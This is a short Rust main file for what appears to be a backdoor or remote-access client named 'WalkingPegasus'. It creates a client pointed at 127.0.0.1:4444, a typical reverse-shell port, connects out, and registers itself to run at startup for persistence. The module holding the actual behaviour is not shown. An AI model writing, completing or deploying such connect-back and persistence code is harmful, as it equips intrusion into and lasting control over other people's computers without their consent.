mod wp;

use wp::WalkingPegasus;

fn main() {
    let wp = WalkingPegasus { addr: "127.0.0.1:4444".to_string() };
    wp.connect();
    wp.addtostartup().expect("");
}
